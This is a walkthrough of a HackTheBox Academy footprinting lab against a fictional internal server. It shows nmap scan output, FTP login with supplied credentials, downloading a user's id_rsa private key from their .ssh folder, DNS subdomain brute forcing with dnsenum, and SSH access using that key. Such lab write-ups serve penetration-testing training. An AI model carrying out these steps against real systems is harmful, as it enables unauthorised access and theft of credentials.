# Footprinting Lab - Easy  

[Footprinting Lab - Easy](https://academy.hackthebox.com/module/112/section/1078)  

>We were commissioned by the company `Inlanefreight` Ltd to test three different servers in their internal network. 
>The first server is an internal DNS server that needs to be investigated. 
>The client wants to know what information we can get out of these services and how this information could be used against its infrastructure. 
>Goal is to gather as much information as possible about the server and find ways to use that information against the company. 
>However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.  
  
>Additionally, our teammates have found the following credentials `ceil:qwer1234`,
>and they pointed out that some of the company's employees were talking about SSH keys on a forum.  

>The administrators have stored a `flag.txt` file on this server to track our progress and measure success.  

## Enumeration  

>NMAP Scans and results:  

```
sudo nmap 10.129.53.210                                        

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
2121/tcp open  ccproxy-ftp
```  

>NMAP Service, Version , OS and default scripts scan results:  

```
sudo nmap -p 21,22,53,2121 -sCV -A -O 10.129.53.210             

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.53.210]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ccproxy-ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Ceil's FTP) [10.129.53.210]
```  

>Observe that port `2121` PrFTPD service read comment about `Ceil` FTP.  

### FTP

>Secure [FTP](https://academy.hackthebox.com/module/112/section/1066) service enumeration with provided `Ceil` credentials.

```
openssl s_client -connect 10.129.53.210:21 -starttls ftp

ftp 10.129.53.210 2121

ls -al
cd .ssh
get id_rsa
```  

### DNS

>[Domain Name System - DNS](https://academy.hackthebox.com/module/112/section/1069) Footprinting and enumeration.  

```
dig ns inlanefreight.htb @10.129.53.210
```  

>Subdomain DNS Brute Forcing.  

```
dnsenum --dnsserver 10.129.53.210 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```  

## Foothold  

>SSH as the user `Ceil` with their discovered `id_rsa` key file from the FTP service on port `2121`.  

```
chmod 600 ceil-ssh.txt

ssh ceil@10.129.53.210 -i ceil-ssh.txt
```  


